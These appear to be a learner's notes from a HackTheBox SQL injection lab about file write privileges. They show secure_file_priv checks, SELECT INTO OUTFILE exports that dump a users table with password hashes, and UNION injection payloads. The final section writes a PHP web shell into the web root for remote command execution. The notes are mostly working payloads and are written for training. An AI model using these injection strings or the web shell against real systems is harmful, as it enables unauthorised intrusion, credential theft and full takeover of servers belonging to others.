## Write File Privileges
#### secure_file_priv

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
![](Pasted%20image%2020260619143710.png)
## SELECT INTO OUTFILE

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

If we go to the back-end server and `cat` the file, we see that table's content:

```shell
3kjS@htb[/htb]$ cat /tmp/credentials 
1 admin 392037dbba51f692776d6cefb6dd546d 
2 newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

When we `cat` the file, we see that text:

```shell
3kjS@htb[/htb]$ cat /tmp/test.txt 

this is a test
```

```shell
3kjS@htb[/htb]$ ls -la /tmp/test.txt 
-rw-rw-rw- 1 mysql mysql 15 Jul 8 06:20 /tmp/test.txt
```

Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
## Writing Files through SQL Injection

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

The `UNION` injection payload would be as follows:

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
![](Pasted%20image%2020260619144157.png)
## Writing a Web Shell

```php
<?php system($_REQUEST[0]); ?>
```

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
![](Pasted%20image%2020260619144247.png)
![](Pasted%20image%2020260619144252.png)
